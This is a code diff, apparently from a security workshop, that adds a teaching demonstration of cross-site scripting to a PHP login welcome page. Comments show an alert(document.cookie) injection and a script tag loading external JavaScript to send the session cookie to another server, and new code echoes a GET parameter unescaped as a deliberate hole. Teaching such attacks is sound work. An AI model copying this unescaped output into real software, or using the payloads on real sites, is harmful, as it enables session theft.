@@ -28,6 +28,26 @@ include('session.php');
                 <div class="login">
                     <h3>Bienvenid@ al sistema <i><?php echo $login_session; ?></i></h3>
 
+
+                    <?php
+                    //Ejemplo 1: inyección XSS (Cross-Site Scripting)
+                    //<a href='' onclick=javascript=alert(document.cookie)>link</a>
+
+
+
+                    //Ejemplo 2: envío la cookie a otro servidor
+                    /*
+                    <SCRIPT SRC=https://appsweb.dev/tallerctc/jsxss.js></SCRIPT>
+
+                    
+                    */
+
+                    if (isset($_GET["valor"])) {
+                        echo "Aquí podrá visualizar el parámetro: " . $_GET["valor"];
+                    }
+
+                    ?>
+
                     <div class="clear"> </div>
                     <h4><a href="logout.php"> Cerrar sesión</a></h4>
                 </div>
